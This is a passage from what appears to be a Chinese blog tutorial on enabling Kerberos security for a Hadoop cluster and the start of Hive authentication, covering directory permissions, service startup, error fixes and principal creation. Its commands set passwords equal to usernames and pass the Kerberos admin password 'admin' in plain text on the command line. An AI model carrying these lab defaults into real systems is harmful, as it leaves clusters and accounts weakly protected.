修改特定本地路径权限</h3><p>因为是不同的用户分别启动不同的程序，所以需要修改之前的所有者和权限</p><table><thead><tr><th><strong>local</strong></th><th>$HADOOP_LOG_DIR</th><th>hdfs:hadoop</th><th>drwxrwxr-x</th></tr></thead><tbody><tr><td><strong>local</strong></td><td>dfs.namenode.name.dir</td><td>hdfs:hadoop</td><td>drwx------</td></tr><tr><td><strong>local</strong></td><td>dfs.datanode.data.dir</td><td>hdfs:hadoop</td><td>drwx------</td></tr><tr><td><strong>local</strong></td><td>dfs.namenode.checkpoint.dir</td><td>hdfs:hadoop</td><td>drwx------</td></tr><tr><td><strong>local</strong></td><td>yarn.nodemanager.local-dirs</td><td>yarn:hadoop</td><td>drwxrwxr-x</td></tr><tr><td><strong>local</strong></td><td>yarn.nodemanager.log-dirs</td><td>yarn:hadoop</td><td>drwxrwxr-x</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $HADOOP_LOG_DIR（所有节点）,三台机器依次运行</span></span><br><span class="line"><span class="comment"># 该变量位于hadoop-env.sh文件，默认值为 $&#123;HADOOP_HOME&#125;/logs</span></span><br><span class="line">chown hdfs:hadoop /opt/module/hadoop-3.1.3/logs/</span><br><span class="line">chmod 775 /opt/module/hadoop-3.1.3/logs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># dfs.namenode.name.dir（NameNode节点），102机器</span></span><br><span class="line"><span class="comment"># 该参数位于hdfs-site.xml文件，默认值为file://$&#123;hadoop.tmp.dir&#125;/dfs/name</span></span><br><span class="line">chown -R hdfs:hadoop /opt/module/hadoop-3.1.3/data/dfs/name/</span><br><span class="line">chmod 700 /opt/module/hadoop-3.1.3/data/dfs/name/</span><br><span class="line"></span><br><span class="line"><span class="comment"># dfs.datanode.data.dir（DataNode节点），三台机器</span></span><br><span class="line"><span class="comment"># 该参数为于hdfs-site.xml文件，默认值为file://$&#123;hadoop.tmp.dir&#125;/dfs/data</span></span><br><span class="line">chown -R hdfs:hadoop /opt/module/hadoop-3.1.3/data/dfs/data/</span><br><span class="line">chmod 700 /opt/module/hadoop-3.1.3/data/dfs/data/</span><br><span class="line"></span><br><span class="line"><span class="comment"># dfs.namenode.checkpoint.dir（SecondaryNameNode节点），104机器</span></span><br><span class="line"><span class="comment"># 该参数位于hdfs-site.xml文件，默认值为file://$&#123;hadoop.tmp.dir&#125;/dfs/namesecondary</span></span><br><span class="line">chown -R hdfs:hadoop /opt/module/hadoop-3.1.3/data/dfs/namesecondary/</span><br><span class="line">chmod 700 /opt/module/hadoop-3.1.3/data/dfs/namesecondary/</span><br><span class="line"></span><br><span class="line"><span class="comment"># yarn.nodemanager.local-dirs（NodeManager节点），三台机器</span></span><br><span class="line"><span class="comment"># 该参数位于yarn-site.xml文件，默认值为file://$&#123;hadoop.tmp.dir&#125;/nm-local-dir</span></span><br><span class="line">chown -R yarn:hadoop /opt/module/hadoop-3.1.3/data/nm-local-dir/</span><br><span class="line">chmod -R 775 /opt/module/hadoop-3.1.3/data/nm-local-dir/</span><br><span class="line"></span><br><span class="line"><span class="comment"># yarn.nodemanager.log-dirs（NodeManager节点），三台机器</span></span><br><span class="line"><span class="comment"># 该参数位于yarn-site.xml文件，默认值为$HADOOP_LOG_DIR/userlogs</span></span><br><span class="line">chown yarn:hadoop /opt/module/hadoop-3.1.3/logs/userlogs/</span><br><span class="line">chmod 775 /opt/module/hadoop-3.1.3/logs/userlogs/</span><br></pre></td></tr></table></figure><h3 id="3-2-启动HDFS">3.2 启动HDFS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =================== 单点启动 ================</span></span><br><span class="line"><span class="comment"># -i：重新加载环境变量</span></span><br><span class="line"><span class="comment"># -u：以特定用户的身份执行后续命令</span></span><br><span class="line"><span class="comment"># 启动NameNode，102机器启动</span></span><br><span class="line">sudo -i -u hdfs hdfs --daemon start namenode</span><br><span class="line"><span class="comment"># 启动DataNode，三台机器依次启动</span></span><br><span class="line">sudo -i -u hdfs hdfs --daemon start datanode</span><br><span class="line"><span class="comment"># 启动SecondaryNameNode，104机器启动</span></span><br><span class="line">sudo -i -u hdfs hdfs --daemon start secondarynamenode</span><br><span class="line"></span><br><span class="line"><span class="comment"># =================== 群起 ===================</span></span><br><span class="line"><span class="comment"># 在主节点（hadoop102）配置hdfs用户到所有节点的免密登录。</span></span><br><span class="line">su hdfs</span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment"># 输入密码hdfs设置免密登陆</span></span><br><span class="line">ssh-copy-id hadoop102</span><br><span class="line">ssh-copy-id hadoop103</span><br><span class="line">ssh-copy-id hadoop104</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改主节点（hadoop102）节点的$HADOOP_HOME/sbin/start-dfs.sh脚本，在顶部增加以下环境变量</span></span><br><span class="line">vim <span class="variable">$HADOOP_HOME</span>/sbin/start-dfs.sh</span><br><span class="line"><span class="comment"># 在顶部增加如下内容</span></span><br><span class="line">HDFS_DATANODE_USER=hdfs</span><br><span class="line">HDFS_NAMENODE_USER=hdfs</span><br><span class="line">HDFS_SECONDARYNAMENODE_USER=hdfs</span><br><span class="line"><span class="comment"># 注：$HADOOP_HOME/sbin/stop-dfs.sh也需在顶部增加上述环境变量才可使用</span></span><br><span class="line"><span class="comment"># 以root用户执行群起脚本，即可启动HDFS集群</span></span><br><span class="line">start-dfs.sh</span><br><span class="line"><span class="comment"># 查看HFDS web页面</span></span><br><span class="line"><span class="comment"># 访问地址为https://hadoop102:9871</span></span><br></pre></td></tr></table></figure><h3 id="3-3-改HDFS特定路径访问权限">3.3 改HDFS特定路径访问权限</h3><table><thead><tr><th><strong>hdfs</strong></th><th>/</th><th>hdfs:hadoop</th><th>drwxr-xr-x</th></tr></thead><tbody><tr><td><strong>hdfs</strong></td><td>/tmp</td><td>hdfs:hadoop</td><td>drwxrwxrwxt</td></tr><tr><td><strong>hdfs</strong></td><td>/user</td><td>hdfs:hadoop</td><td>drwxrwxr-x</td></tr><tr><td><strong>hdfs</strong></td><td>yarn.nodemanager.remote-app-log-dir</td><td>yarn:hadoop</td><td>drwxrwxrwxt</td></tr><tr><td><strong>hdfs</strong></td><td>mapreduce.jobhistory.intermediate-done-dir</td><td>mapred:hadoop</td><td>drwxrwxrwxt</td></tr><tr><td><strong>hdfs</strong></td><td>mapreduce.jobhistory.done-dir</td><td>mapred:hadoop</td><td>drwxrwx—</td></tr></tbody></table><p>若上述路径不存在，需手动创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下操作都在hadoop102</span></span><br><span class="line"><span class="comment"># (1)创建hdfs/hadoop主体，执行以下命令并按照提示输入密码</span></span><br><span class="line">kadmin.local -q <span class="string">"addprinc hdfs/hadoop"</span></span><br><span class="line"><span class="comment"># (2)认证hdfs/hadoop主体，执行以下命令并按照提示输入密码</span></span><br><span class="line">kinit hdfs/hadoop</span><br><span class="line"><span class="comment"># 按照上述要求修改指定路径的所有者和权限</span></span><br><span class="line"><span class="comment"># 修改/、/tmp、/user路径</span></span><br><span class="line">hadoop fs -chown hdfs:hadoop / /tmp /user</span><br><span class="line">hadoop fs -chmod 755 /</span><br><span class="line">hadoop fs -chmod 1777 /tmp</span><br><span class="line">hadoop fs -chmod 775 /user</span><br><span class="line"><span class="comment"># 参数yarn.nodemanager.remote-app-log-dir位于yarn-site.xml文件，默认值/tmp/logs</span></span><br><span class="line">hadoop fs -chown yarn:hadoop /tmp/logs</span><br><span class="line">hadoop fs -chmod 1777 /tmp/logs</span><br><span class="line"><span class="comment"># (3)参数mapreduce.jobhistory.intermediate-done-dir位于mapred-site.xml文件，</span></span><br><span class="line"><span class="comment"># 默认值为/tmp/hadoop-yarn/staging/history/done_intermediate，需保证该路径的所有上级目录（除/tmp）的所有者均为mapred，所属组为hadoop，权限为770</span></span><br><span class="line">hadoop fs -chown -R mapred:hadoop /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/done_intermediate</span><br><span class="line">hadoop fs -chmod -R 1777 /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/done_intermediate</span><br><span class="line"></span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/</span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/staging/</span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/</span><br><span class="line"></span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/</span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/staging/</span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/</span><br><span class="line"><span class="comment"># (4)参数mapreduce.jobhistory.done-dir位于mapred-site.xml文件，默认值为/tmp/hadoop-yarn/staging/history/done，</span></span><br><span class="line"><span class="comment"># 需保证该路径的所有上级目录（除/tmp）的所有者均为mapred，所属组为hadoop，权限为770</span></span><br><span class="line">hadoop fs -chown -R mapred:hadoop /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/<span class="keyword">done</span></span><br><span class="line">hadoop fs -chmod -R 750 /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/</span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/staging/</span><br><span class="line">hadoop fs -chown mapred:hadoop /tmp/hadoop-yarn/</span><br><span class="line"></span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/staging/<span class="built_in">history</span>/</span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/staging/</span><br><span class="line">hadoop fs -chmod 770 /tmp/hadoop-yarn/</span><br></pre></td></tr></table></figure><h3 id="3-4-启动Yarn">3.4 启动Yarn</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==============单点启动================</span></span><br><span class="line"><span class="comment"># 启动ResourceManager</span></span><br><span class="line">sudo -i -u yarn yarn --daemon start resourcemanager</span><br><span class="line"><span class="comment"># 启动NodeManager</span></span><br><span class="line">sudo -i -u yarn yarn --daemon start nodemanager</span><br><span class="line">sudo -i -u yarn yarn --daemon start nodemanager</span><br><span class="line">sudo -i -u yarn yarn --daemon start nodemanager</span><br><span class="line"><span class="comment"># =================群起=====================</span></span><br><span class="line"><span class="comment"># 在Yarn主节点（hadoop103）配置yarn用户到所有节点的免密登录</span></span><br><span class="line"><span class="comment"># 修改主节点（hadoop103）的$HADOOP_HOME/sbin/start-yarn.sh，在顶部增加以下环境变量</span></span><br><span class="line">vim <span class="variable">$HADOOP_HOME</span>/sbin/start-yarn.sh</span><br><span class="line"><span class="comment"># 在顶部增加如下内容</span></span><br><span class="line">YARN_RESOURCEMANAGER_USER=yarn</span><br><span class="line">YARN_NODEMANAGER_USER=yarn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注：stop-yarn.sh也需在顶部增加上述环境变量才可使用。</span></span><br><span class="line"><span class="comment"># 以root用户执行$HADOOP_HOME/sbin/start-yarn.sh脚本即可启动yarn集群。</span></span><br><span class="line">start-yarn.sh</span><br><span class="line"><span class="comment"># 访问Yarn web页面</span></span><br><span class="line"><span class="comment"># 访问地址为http://hadoop103:8088</span></span><br></pre></td></tr></table></figure><h3 id="3-5-启动HistoryServer">3.5 启动HistoryServer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动历史服务器</span></span><br><span class="line">sudo -i -u mapred mapred --daemon start historyserver</span><br><span class="line"><span class="comment"># 查看历史服务器web页面</span></span><br><span class="line"><span class="comment"># 访问地址为http://hadoop102:19888</span></span><br></pre></td></tr></table></figure><h2 id="4、启动遇坑详解">4、启动遇坑详解</h2><h3 id="4-1-DataNode无法连接上NameNode-提示-GSS-initiate-failed">4.1 DataNode无法连接上NameNode 提示 : GSS initiate failed</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看namenode的报错信息</span></span><br><span class="line">2022-03-28 17:57:11,389 WARN SecurityLogger.org.apache.hadoop.ipc.Server: Auth failed <span class="keyword">for</span> 192.168.31.213:44542:null (GSS initiate failed) with <span class="literal">true</span> cause: (GSS initiate failed)</span><br><span class="line">2022-03-28 17:57:14,706 WARN SecurityLogger.org.apache.hadoop.ipc.Server: Auth failed <span class="keyword">for</span> 192.168.31.213:34648:null (GSS initiate failed) with <span class="literal">true</span> cause: (GSS initiate failed)</span><br></pre></td></tr></table></figure><p><strong>原因是JDK没有装JCE组件, JDK需要下载安装JCE组件. 重启服务即可；或者使用使用JDK 1.8.0_161或更高版本时，不需要再安装JCE Policy File，因为JDK 1.8.0_161默认启用无限强度加密。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JCE的安装</span></span><br><span class="line"><span class="comment"># 官网：http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html</span></span><br><span class="line"><span class="comment"># 随便找一个目录, 解压 unzip jce_policy-8.zip , 获取到UnlimitedJCEPolicyJDK8文件夹</span></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip jce_policy-8.zip</span><br><span class="line"><span class="comment"># 查看文件</span></span><br><span class="line">ll UnlimitedJCEPolicyJDK8/</span><br><span class="line"><span class="comment"># 备份 $&#123;JAVA_HOME&#125;/jre/lib/security目录</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$&#123;JAVA_HOME&#125;</span></span><br><span class="line">cp -r <span class="variable">$&#123;JAVA_HOME&#125;</span>/jre/lib/security  <span class="variable">$&#123;JAVA_HOME&#125;</span>/jre/lib/security_bak</span><br><span class="line"><span class="comment"># 把UnlimitedJCEPolicyJDK8目录下的所有jar包(US_export_policy.jar和local_policy.jar)拷贝至集群所有节点的$&#123;JAVA_HOME&#125;/jre/lib/security目录下</span></span><br><span class="line">cp UnlimitedJCEPolicyJDK8/*.jar <span class="variable">$&#123;JAVA_HOME&#125;</span>/jre/lib/security</span><br><span class="line"><span class="comment"># 安装完成, 重启相关服务即可(比如kerberos/hadoop相关服务)</span></span><br><span class="line"><span class="comment"># 启用krb5kdc和重启kerberos服务</span></span><br></pre></td></tr></table></figure><h3 id="4-2-Hadoop集成kerberos后-报错-AccessControlException">4.2 Hadoop集成kerberos后,报错:AccessControlException</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 报错信息</span></span><br><span class="line">klist</span><br><span class="line">Ticket cache: KEYRING:persistent:0:krb_ccache_MkHX3zi</span><br><span class="line">Default principal: hdfs/hadoop102@EXAMPLE.COM</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">2022-03-28T17:35:19  2022-03-29T17:35:19  krbtgt/EXAMPLE.COM@EXAMPLE.COM</span><br><span class="line">hadoop fs -ls /</span><br><span class="line">2022-03-28 20:23:27,667 WARN ipc.Client: Exception encountered <span class="keyword">while</span> connecting to the server : org.apache.hadoop.security.AccessControlException: Client cannot authenticate via:[TOKEN, KERBEROS]</span><br><span class="line">ls: DestHost:destPort hadoop102:8020 , LocalHost:localPort master01/192.xx.xx:0. Failed on <span class="built_in">local</span> exception: java.io.IOException: org.apache.hadoop.security.AccessControlException: Client cannot authenticate via:[TOKEN, KERBEROS]</span><br></pre></td></tr></table></figure><p>解决方法：<strong>修改 Kerboeros配置文件 /etc/krb5.conf , 注释掉 : default_ccache_name 属性，然后执行kdestroy，重新kinit</strong></p><p>可以参考：<a href="https://blog.csdn.net/zhanglong_4444/article/details/115268262" target="_blank" rel="noopener" title="https://blog.csdn.net/zhanglong_4444/article/details/115268262">https://blog.csdn.net/zhanglong_4444/article/details/115268262</a></p><h2 id="5、安全集群使用说明">5、安全集群使用说明</h2><h3 id="5-1-用户要求">5.1 用户要求</h3><p>以下使用说明均基于普通用户，安全集群对用户有以下要求：</p><ul><li>集群中的每个节点都需要创建该用户</li><li>该用户需要属于hadoop用户组</li><li>需要创建该用户对应的Kerberos主体</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建用户（存在可跳过），须在所有节点执行</span></span><br><span class="line">useradd shawn</span><br><span class="line"><span class="built_in">echo</span> shawn| passwd --stdin shawn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入hadoop组，须在所有节点执行</span></span><br><span class="line">usermod -a -G hadoop shawn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建主体，直接输入账户和密码</span></span><br><span class="line">kadmin -p admin/admin -wadmin -q<span class="string">"addprinc -pw shawn shawn"</span></span><br></pre></td></tr></table></figure><h3 id="5-2-访问HDFS集群文件">5.2 访问HDFS集群文件</h3><p>首先针对是shell环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认证</span></span><br><span class="line">kinit shawn</span><br><span class="line"><span class="comment"># 查看当前认证用户</span></span><br><span class="line">klist</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">hadoop fs -ls /</span><br><span class="line"><span class="comment"># 注销认证</span></span><br><span class="line">kdestroy</span><br><span class="line"><span class="comment"># 再次查看，发现报错没有认证</span></span><br><span class="line">hadoop fs -ls /</span><br></pre></td></tr></table></figure><p>对于web页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载认证客户端(windows),然后安装好</span></span><br><span class="line"><span class="comment"># http://web.mit.edu/kerberos/dist/kfw/4.1/kfw-4.1-amd64.msi</span></span><br><span class="line"><span class="comment"># 编辑C:\ProgramData\MIT\Kerberos5\krb5.ini文件</span></span><br><span class="line"><span class="comment"># 内容如下</span></span><br><span class="line">[libdefaults]</span><br><span class="line"> dns_lookup_realm = <span class="literal">false</span></span><br><span class="line"> ticket_lifetime = 24h</span><br><span class="line"> forwardable = <span class="literal">true</span></span><br><span class="line"> rdns = <span class="literal">false</span></span><br><span class="line"> default_realm = EXAMPLE.COM</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> EXAMPLE.COM = &#123;</span><br><span class="line">  kdc = hadoop102</span><br><span class="line">  admin_server = hadoop102</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br></pre></td></tr></table></figure><p>配置火狐浏览器(其他浏览器有可能有问题)，打开浏览器，在地址栏输入<code>about:config</code>，点击回车；搜索<code>network.negotiate-auth.trusted-uris</code>，修改值为要访问的主机名（hadoop102）；下一步搜索<code>network.auth.use-sspi</code>，双击将值变为false</p><p>最后启动认证，启动Kerberos客户端，点击<strong>Get Ticket</strong>，输入主体名和密码，点击OK，认证成功，访问web界面</p><h3 id="5-3-提交MapReduce任务">5.3 提交MapReduce任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认证</span></span><br><span class="line">kinit shawn</span><br><span class="line"><span class="comment"># 提交任务</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar pi 1 1</span><br></pre></td></tr></table></figure><h1>三、Hive安全认证</h1><h2 id="1、Hive用户认证配置">1、Hive用户认证配置</h2><h3 id="1-1-创建Hive系统用户和Kerberos主体">1.1 创建Hive系统用户和Kerberos主体</h3><p>hive作为服务来进行Kerberos认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建系统用户，三台机器都要创建</span></span><br><span class="line">useradd hive -g hadoop</span><br><span class="line"><span class="built_in">echo</span> hive | passwd --stdin hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Kerberos主体并生成keytab文件，在hadoop102创建</span></span><br><span class="line"><span class="comment"># 创建hive用户的Kerberos主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey hive/hadoop102"</span></span><br><span class="line"><span class="comment"># 在Hive所部署的节点生成keytab文件</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/hive.service.keytab hive/hadoop102"</span></span><br><span class="line"><span class="comment"># 修改keytab文件所有者和访问权限</span></span><br><span class="line">chown -R root:hadoop /etc/security/keytab/</span><br><span class="line">chmod 660 /etc/security/keytab/hive.service.keytab</span><br></pre></td></tr></table></figure><h3 id="1-2-配置认证">1.2 配置认证</h3><p>修改<code>$HIVE_HOME/conf/hive-site.xml</code>文件，<code>vim $HIVE_HOME/conf/hive-site.xml</code>，增加如下属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HiveServer2启用Kerberos认证 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.authentication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>kerberos<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HiveServer2服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.authentication.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hive/hadoop102@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HiveServer2服务的Kerberos密钥文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.authentication.kerberos.keytab<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/hive.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Metastore启动认证 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.sasl.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Metastore Kerberos密钥文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.kerberos.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/hive.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Metastore Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hive/hadoop102@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改<code>$HADOOP_HOME/etc/hadoop/core-site.xml</code>文件，<code>vim 